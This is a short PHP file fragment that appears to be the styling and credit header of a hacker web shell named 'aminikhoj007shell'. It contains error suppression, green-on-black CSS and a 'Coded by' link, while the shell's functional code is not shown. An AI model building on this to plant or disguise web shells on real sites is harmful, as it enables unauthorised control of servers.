<?
error_reporting(0);
/* AmiNikhoj007 {03 janu 2021}

Loader aminikhoj007shell.sh
*/
?>

<style type='text/css'>
html { overflow-x: auto }
BODY { font-family: Verdana, Tahoma, Arial, sans-serif; font-size: 11px; margin: 0px; padding: 0px; text-align: center; color: #4ced28; background-color: #000000 }
TABLE, TR, TD { font-family: Verdana, Tahoma, Arial, sans-serif; font-size: 11px; color: #4ced28; background-color: #0000000 }
BODY,TD {FONT-SIZE: 13px; FONT-FAMILY: verdana, arial, helvetica;}
A:link {COLOR: #2fe028; TEXT-DECORATION: none}
A:active {	COLOR: #2fe028; TEXT-DECORATION: none;}
A:visited {COLOR: #2fe028; TEXT-DECORATION: none;}
A:hover {COLOR: #2fe028; TEXT-DECORATION: none;}
BODY {
	SCROLLBAR-FACE-COLOR: #080707;
	SCROLLBAR-HIGHLIGHT-COLOR: #a61ac9;
	SCROLLBAR-SHADOW-COLOR: #a61ac9;
	SCROLLBAR-3DLIGHT-COLOR: #a61ac9;
	SCROLLBAR-ARROW-COLOR: #4ced28;
	SCROLLBAR-TRACK-COLOR: #4ced28;
	SCROLLBAR-DARKSHADOW-COLOR: #a61ac9}
...
img.attach { padding: 2px; border: 2px outset #3170f7 }

#tb { padding: 0px; margin: 0px; background-color: #0000000; border: 1px solid #a61ac9; }
#logostrip { padding: 0px; margin: 0px; background-color: #4ced28; border: 1px solid #a61ac9; }
#content { padding: 10px; margin: 10px; background-color: #0000000; border: 1px solid #a61ac9; }
#logo { FONT-SIZE: 50px; }
input { width: 80; height : 17; background-color : #4ced28;
 	border-style: solid;border-width: 1; border-color: #a61ac9; font-size: xx-small; cursor: pointer; }
#input2 { width: 150; height : 17; background-color : #4ced28;
 	border-style: solid;border-width: 1; border-color: #a61ac9; font-size: xx-small; cursor: pointer; }
...
<center>Coded by Loader <a href="http://github.com/aminikhoj007">AmiNikhoj007</a></center>
